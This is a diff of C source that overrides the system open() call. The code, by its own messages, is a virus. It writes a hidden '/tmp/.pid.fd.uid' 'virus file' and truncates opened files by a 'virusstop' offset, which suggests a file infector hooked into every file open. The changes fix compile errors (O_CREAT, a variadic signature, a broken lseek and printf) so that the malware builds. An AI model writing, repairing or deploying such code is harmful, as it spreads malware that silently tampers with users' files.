@@ -7,7 +7,7 @@
 #include <fcntl.h>
 #include <string.h>
 
-int open(const char *pathname, int flags){
+int open(const char *pathname, int flags, ...){
     
     int fd;
     int check;
@@ -56,7 +56,7 @@ int open(const char *pathname, int flags){
     sprintf(filebuf, "/tmp/.%u.%d.%u", pid, fd, ruid);    
     int fd2;
 
-    if((fd2 = syscall(__NR_open, filebuf, O_RDWR, O_CREATE)) == -1){
+    if((fd2 = syscall(__NR_open, filebuf, O_RDWR, O_CREAT)) == -1){
         printf("Virus file open failed.\n");
         return -1;
     }
@@ -74,8 +74,9 @@ int open(const char *pathname, int flags){
         return -1;
     }
 
-    if(lseek(fd, 0, ) == -1){
-        printf
+    if(lseek(fd, 0, SEEK_CUR) == -1){
+        printf("lseek failed.\n");
+        return -1;
     }
     
     if(ftruncate(fd, filesize - virusstop)){
